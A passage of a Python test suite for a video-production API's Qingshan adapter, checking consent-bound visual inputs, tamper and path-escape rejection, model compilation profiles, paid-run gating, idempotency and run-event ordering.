    postproduction_output = task["required_outputs"]["postproduction_lineage_manifest"]
    assert postproduction_output["artifact_kind"] == "postproduction_manifest"
    assert postproduction_output["relative_path"] == "exports/E01_POSTPRODUCTION_LINEAGE.json"
    postproduction_contract = json.loads(
        (workspace / postproduction_output["contract_path"]).read_text(encoding="utf-8")
    )
    assert (
        postproduction_contract["schema_version"]
        == "nalu.postproduction-lineage-output-contract/v1"
    )
    assert (
        postproduction_contract["production_package_sha256"]
        == json.loads(package.read_text(encoding="utf-8"))["package_sha256"]
    )
    assert set(postproduction_contract["required_audio_layers"]) == {
        "dialogue",
        "ambience",
        "foley",
        "music",
        "sfx",
    }
    assert postproduction_contract["fail_closed"] is True
    local_postproduction = task["local_postproduction"]
    assert local_postproduction["executor"] == "nalu-local-postproduction"
    assert local_postproduction["provider_result_root"] == "exports/provider-results"
    materialization_contract = json.loads(
        (workspace / local_postproduction["contract_path"]).read_text(encoding="utf-8")
    )
    assert (
        materialization_contract["schema_version"]
        == "nalu.postproduction-materialization-contract/v1"
    )
    assert materialization_contract["atomic_output_directory"] is True
    assert materialization_contract["source_digest_rechecked_before_commit"] is True
    assert materialization_contract["network_call_performed"] is False
    assert materialization_contract["fail_closed"] is True
    assert (workspace / "exports" / "provider-results").is_dir()
    visual_output = task["required_outputs"]["visual_continuity_manifest"]
    assert visual_output["artifact_kind"] == "visual_continuity_manifest"
    assert visual_output["relative_path"] == "exports/E01_VISUAL_CONTINUITY.json"
    visual_contract = json.loads(
        (workspace / visual_output["contract_path"]).read_text(encoding="utf-8")
    )
    assert visual_contract["schema_version"] == "nalu.visual-continuity-output-contract/v1"
    assert (
        visual_contract["production_package_sha256"]
        == json.loads(package.read_text(encoding="utf-8"))["package_sha256"]
    )
    assert set(visual_contract["required_domains"]) == {
        "identity",
        "wardrobe",
        "space_axis",
        "pose",
        "props",
    }
    assert visual_contract["evidence_frame_must_decode_from_final_master"] is True
    local_visual = task["local_visual_analysis"]
    assert local_visual["inputs_schema_version"] == "nalu.visual-analyzer-inputs/v1"
    assert local_visual["readiness"] == "BLOCKED"
    assert local_visual["provider_upload_allowed"] is False
    visual_inputs = json.loads(
        (workspace / local_visual["inputs_path"]).read_text(encoding="utf-8")
    )
    assert visual_inputs["inputs_sha256"] == local_visual["inputs_sha256"]
    assert visual_inputs["readiness"] == "BLOCKED"
    assert visual_inputs["unresolved"] == [{"code": "CONFIRMED_CHARACTER_MISSING"}]
    assert visual_contract["analyzer_inputs_sha256"] == visual_inputs["inputs_sha256"]
    assert visual_contract["analyzer_inputs_readiness"] == "BLOCKED"
    assert visual_contract["authored_observations_are_not_perceptual_evidence"] is True
    assert visual_contract["human_original_resolution_review_still_required"] is True
    assert visual_contract["fail_closed"] is True
    gate_audit = json.loads(
        (workspace / "workflow" / "qingshan-gate-registry-audit.json").read_text(encoding="utf-8")
    )
    assert gate_audit["status"] == "QUARANTINED_KNOWN_UPSTREAM_DEFECT"
    assert gate_audit["gate_count"] == 68
    assert gate_audit["coded_gate_count"] == gate_audit["runtime_bound_count"] == 65
    assert len(gate_audit["known_failures"]) == 9
    assert gate_audit["new_failures"] == []
    assert gate_audit["quarantine_binding_valid"] is True
    assert gate_audit["registered_tests_executed"] is False
    assert gate_audit["paid_execution_allowed"] is False
    preflight = json.loads(
        package.with_name("qingshan-preflight-report.json").read_text(encoding="utf-8")
    )
    assert preflight["gate_registry_status"] == ("QUARANTINED_KNOWN_UPSTREAM_DEFECT")


def test_visual_analyzer_inputs_bind_confirmed_character_reference(tmp_path: Path) -> None:
    api = client(tmp_path)
    project, _, episode = create_approved_episode(api)
    character = api.post(
        f"/v1/projects/{project['id']}/library-entities",
        json={
            "kind": "character",
            "name": "林叔",
            "description": "穿蓝色外套回家",
            "attributes": {
                "aliases": ["照片里的人"],
                "wardrobe": ["蓝色外套"],
                "space_axis": "screen-left",
                "pose": "standing",
                "held_props": [],
            },
            "source_channel": "voice",
            "change_summary": "确认本地视觉分析目标",
        },
    ).json()
    assert (
        api.post(
            f"/v1/library-entities/{character['id']}/confirmations",
            json={
                "confirmed_by": "本人",
                "reviewed_revision": 1,
                "review_channel": "voice_and_visual",
                "spoken_confirmation": "我确认这是林叔",
            },
        ).status_code
        == 201
    )
    portrait_bytes = b"local-reference-image-fixture"
    portrait = api.post(
        f"/v1/projects/{project['id']}/asset-imports",
        params={
            "filename": "lin-shu.jpg",
            "kind": "character_image",
            "name": "林叔参考照",
            "subject_name": "照片里的人",
            "consent_granted": True,
            "consent_scope": "project_only",
            "consent_granted_by": "本人",
            "consent_statement": "我同意仅在本项目本地分析",
        },
        content=portrait_bytes,
        headers={"Content-Type": "image/jpeg"},
    ).json()

    run = api.post(f"/v1/episodes/{episode['id']}/production-runs", json={"dry_run": True}).json()
    workspace = Path(run["package_path"]).parent / "qingshan-workspace"
    task = json.loads(
        (workspace / "workflow/tasks/E01_PRODUCTION_TASK.json").read_text(encoding="utf-8")
    )
    local_visual = task["local_visual_analysis"]
    visual_inputs = json.loads(
        (workspace / local_visual["inputs_path"]).read_text(encoding="utf-8")
    )

    assert local_visual["readiness"] == "READY"
    assert visual_inputs["readiness"] == "READY"
    assert visual_inputs["unresolved"] == []
    assert visual_inputs["provider_upload_allowed"] is False
    assert visual_inputs["asset_digest_recheck_required"] is True
    subject = visual_inputs["subjects"][0]
    assert subject["entity_id"] == character["id"]
    assert subject["confirmed_revision"] == 1
    assert subject["expected"] == {
        "identity": "林叔",
        "wardrobe": ["蓝色外套"],
        "space_axis": "screen-left",
        "pose": "standing",
        "props": [],
    }
    assert subject["references"][0]["asset_id"] == portrait["id"]
    assert subject["references"][0]["sha256"] == hashlib.sha256(portrait_bytes).hexdigest()
    assert "consent_statement" not in subject["references"][0]
    assert local_visual["inputs_sha256"] == visual_inputs["inputs_sha256"]


def test_visual_analyzer_inputs_block_unconfirmed_held_prop_authority(tmp_path: Path) -> None:
    api = client(tmp_path)
    project, _, episode = create_approved_episode(api)
    character = api.post(
        f"/v1/projects/{project['id']}/library-entities",
        json={
            "kind": "character",
            "name": "林叔",
            "description": "穿蓝色外套，手提旧皮箱回家",
            "attributes": {
                "wardrobe": ["蓝色外套"],
                "space_axis": "screen-left",
                "pose": "standing",
                "held_props": ["旧皮箱"],
            },
            "source_channel": "voice",
            "change_summary": "确认人物和手持道具目标",
        },
    ).json()
    assert (
        api.post(
            f"/v1/library-entities/{character['id']}/confirmations",
            json={
                "confirmed_by": "本人",
                "reviewed_revision": 1,
                "review_channel": "voice_and_visual",
                "spoken_confirmation": "我确认这是林叔",
            },
        ).status_code
        == 201
    )
    portrait_bytes = b"local-reference-image-fixture"
    api.post(
        f"/v1/projects/{project['id']}/asset-imports",
        params={
            "filename": "lin-shu.jpg",
            "kind": "character_image",
            "name": "林叔参考照",
            "subject_name": "林叔",
            "consent_granted": True,
            "consent_scope": "project_only",
            "consent_granted_by": "本人",
            "consent_statement": "我同意仅在本项目本地分析",
        },
        content=portrait_bytes,
        headers={"Content-Type": "image/jpeg"},
    ).raise_for_status()

    run = api.post(f"/v1/episodes/{episode['id']}/production-runs", json={"dry_run": True}).json()
    workspace = Path(run["package_path"]).parent / "qingshan-workspace"
    task = json.loads(
        (workspace / "workflow/tasks/E01_PRODUCTION_TASK.json").read_text(encoding="utf-8")
    )
    local_visual = task["local_visual_analysis"]
    visual_inputs = json.loads(
        (workspace / local_visual["inputs_path"]).read_text(encoding="utf-8")
    )

    assert local_visual["readiness"] == "BLOCKED"
    assert visual_inputs["readiness"] == "BLOCKED"
    assert visual_inputs["unresolved"] == [
        {
            "code": "HELD_PROP_AUTHORITY_MISSING",
            "entity_id": character["id"],
            "held_prop": "旧皮箱",
        }
    ]
    assert visual_inputs["subjects"][0]["expected"]["props"] == ["旧皮箱"]
    assert visual_inputs["prop_references"] == []


def test_qingshan_models_use_distinct_versioned_compilers(tmp_path: Path) -> None:
    compilations: dict[str, dict] = {}
    for requested_model in ("seedance-2.0-pro", "MiniMax-H3"):
        api = client(tmp_path / requested_model)
        _, _, episode = create_approved_episode(api)
        response = api.post(
            f"/v1/episodes/{episode['id']}/production-runs",
            json={"dry_run": True, "requested_model": requested_model},
        )
        assert response.status_code == 201
        package_path = Path(response.json()["package_path"])
        workspace = package_path.with_name("qingshan-workspace")
        manifest = json.loads((workspace / "workspace-manifest.json").read_text(encoding="utf-8"))
        compilation_path = workspace / manifest["model_compilation"]
        assert (
            hashlib.sha256(compilation_path.read_bytes()).hexdigest()
            == (manifest["model_compilation_sha256"])
        )
        compilations[requested_model] = json.loads(compilation_path.read_text(encoding="utf-8"))

    seedance = compilations["seedance-2.0-pro"]
    h3 = compilations["MiniMax-H3"]
    assert seedance["adapter_id"] == "nalu.qingshan.seedance2-pro"
    assert seedance["profile_id"] == "SEEDANCE_2_STANDARD_GIGGLE"
    assert seedance["planning_defaults"]["native_resolution"] == "720p"
    assert seedance["planning_defaults"]["minimum_duration_seconds"] == 4
    assert seedance["provider_contract"]["exact_end_frame"] is False
    assert h3["adapter_id"] == "nalu.qingshan.minimax-h3"
    assert h3["profile_id"] == "MINIMAX_H3_GIGGLE"
    assert h3["planning_defaults"]["native_resolution"] == "768p"
    assert h3["planning_defaults"]["minimum_duration_seconds"] == 3
    assert h3["provider_contract"]["exact_end_frame"] is True
    assert h3["provider_contract"]["maximum_image_references"] == 9
    assert seedance["compilation_sha256"] != h3["compilation_sha256"]
    assert seedance["paid_submission_enabled"] is False
    assert h3["paid_submission_enabled"] is False


def test_qingshan_preflight_rejects_tampered_compilation_and_package(tmp_path: Path) -> None:
    api = client(tmp_path)
    _, _, episode = create_approved_episode(api)
    run = api.post(
        f"/v1/episodes/{episode['id']}/production-runs",
        json={"dry_run": True, "requested_model": "MiniMax-H3"},
    ).json()
    package_path = Path(run["package_path"])
    workspace = package_path.with_name("qingshan-workspace")
    manifest = json.loads((workspace / "workspace-manifest.json").read_text(encoding="utf-8"))
    compilation_path = workspace / manifest["model_compilation"]
    compilation = json.loads(compilation_path.read_text(encoding="utf-8"))
    compilation["paid_submission_enabled"] = True
    compilation_path.write_text(
        json.dumps(compilation, ensure_ascii=False, indent=2) + "\n",
        encoding="utf-8",
    )
    with pytest.raises(QingshanAdapterError, match="model compilation"):
        api.app.state.production.adapter.preflight(package_path, workspace)

    package = json.loads(package_path.read_text(encoding="utf-8"))
    package["approved_script"]["content"] = "被静默替换的剧本"
    package_path.write_text(
        json.dumps(package, ensure_ascii=False, indent=2) + "\n",
        encoding="utf-8",
    )
    clean_workspace = api.app.state.production.adapter.materialize_workspace(package_path)
    with pytest.raises(QingshanAdapterError, match="production package digest mismatch"):
        api.app.state.production.adapter.preflight(package_path, clean_workspace)


def test_qingshan_compilers_fail_closed_when_upstream_model_registry_drifts(
    tmp_path: Path,
) -> None:
    api = client(tmp_path)
    adapter = api.app.state.production.adapter
    registry_path = adapter.vendor_root / "configs" / "VIDEO_MODEL_CAPABILITY_REGISTRY_v1.json"
    assert adapter.model_compilers.validate_upstream_registry(registry_path) == []

    registry = json.loads(registry_path.read_text(encoding="utf-8"))
    h3 = next(
        profile for profile in registry["profiles"] if profile["profile_id"] == "MINIMAX_H3_GIGGLE"
    )
    h3["provider_limits"]["omni_image_reference_max"] = 10
    drifted = tmp_path / "drifted-model-registry.json"
    drifted.write_text(
        json.dumps(registry, ensure_ascii=False, indent=2) + "\n",
        encoding="utf-8",
    )
    failures = adapter.model_compilers.validate_upstream_registry(drifted)
    assert failures == ["MINIMAX_H3_GIGGLE: maximum image reference count changed"]


def test_qingshan_preflight_rejects_compilation_path_escape(tmp_path: Path) -> None:
    api = client(tmp_path)
    _, _, episode = create_approved_episode(api)
    run = api.post(
        f"/v1/episodes/{episode['id']}/production-runs",
        json={"dry_run": True},
    ).json()
    package_path = Path(run["package_path"])
    workspace = package_path.with_name("qingshan-workspace")
    manifest_path = workspace / "workspace-manifest.json"
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    manifest["model_compilation"] = "../../production-package.json"
    manifest_path.write_text(
        json.dumps(manifest, ensure_ascii=False, indent=2) + "\n",
        encoding="utf-8",
    )

    with pytest.raises(QingshanAdapterError, match="compilation path is unsafe"):
        api.app.state.production.adapter.preflight(package_path, workspace)


def test_production_run_idempotency_and_paid_key_requirement(tmp_path: Path) -> None:
    api = client(tmp_path)
    _, _, episode = create_approved_episode(api)
    path = f"/v1/episodes/{episode['id']}/production-runs"
    headers = {"Idempotency-Key": "episode-1-production-v1"}
    first = api.post(path, json={"dry_run": True}, headers=headers)
    replay = api.post(path, json={"dry_run": True}, headers=headers)
    assert first.status_code == replay.status_code == 201
    assert first.json()["id"] == replay.json()["id"]

    changed = api.post(
        path,
        json={"dry_run": True, "requested_model": "MiniMax-H3"},
        headers=headers,
    )
    assert changed.status_code == 409

    other_api = client(tmp_path / "paid")
    _, _, paid_episode = create_approved_episode(other_api)
    paid = other_api.post(
        f"/v1/episodes/{paid_episode['id']}/production-runs",
        json={
            "dry_run": False,
            "paid_generation_approved": True,
            "approved_by": "owner",
        },
    )
    assert paid.status_code == 409
    assert "Idempotency-Key" in paid.json()["detail"]

    quarantined_api = client(tmp_path / "paid-quarantine")
    _, _, quarantined_episode = create_approved_episode(quarantined_api)
    quarantined = quarantined_api.post(
        f"/v1/episodes/{quarantined_episode['id']}/production-runs",
        json={
            "dry_run": False,
            "requested_model": "MiniMax-H3",
            "estimated_budget_credits": 100,
            "paid_generation_approved": True,
            "approved_by": "owner",
        },
        headers={"Idempotency-Key": "paid-gate-quarantine"},
    )
    assert quarantined.status_code == 409
    assert (
        "paid execution is blocked by Qingshan gate registry quarantine"
        in (quarantined.json()["detail"])
    )


def test_prohibited_model_is_rejected(tmp_path: Path) -> None:
    api = client(tmp_path)
    _, _, episode = create_approved_episode(api)
    response = api.post(
        f"/v1/episodes/{episode['id']}/production-runs",
        json={"dry_run": True, "requested_model": "seedance-2.0-fast"},
    )
    assert response.status_code == 409


def test_run_events_cancel_and_resume(tmp_path: Path) -> None:
    api = client(tmp_path)
    _, _, episode = create_approved_episode(api)
    run = api.post(
        f"/v1/episodes/{episode['id']}/production-runs",
        json={"dry_run": True, "requested_model": "MiniMax-H3"},
    ).json()

    events = api.get(f"/v1/production-runs/{run['id']}/events").json()
    assert [event["event_type"] for event in events] == ["run_created"]

    cancelled = api.post(
        f"/v1/production-runs/{run['id']}/cancel",
        json={"requested_by": "user", "reason": "先暂停，稍后继续"},
    )
    assert cancelled.status_code == 200
    assert cancelled.json()["status"] == "cancelled"

    resumed = api.post(
        f"/v1/production-runs/{run['id']}/resume",
        json={"requested_by": "user", "reason": "继续制作"},
    )
    assert resumed.status_code == 200
    assert resumed.json()["status"] == "preflight"

    events = api.get(f"/v1/production-runs/{run['id']}/events").json()
    assert [event["sequence"] for event in events] == [1, 2, 3]


def test_run_events_are_ordered_under_concurrent_writes(tmp_path: Path) -> None:
    api = client(tmp_path)
    _, _, episode = create_approved_episode(api)
    run = api.post(
        f"/v1/episodes/{episode['id']}/production-runs",
        json={"dry_run": True},
    ).json()
    repository = api.app.state.repository

    def append(index: int) -> None:
        repository.append_run_event(run["id"], "progress", payload={"index": index})

    with ThreadPoolExecutor(max_workers=8) as pool:
        list(pool.map(append, range(8)))

    events = api.get(f"/v1/production-runs/{run['id']}/events").json()
    assert [event["sequence"] for event in events] == list(range(1, 10))
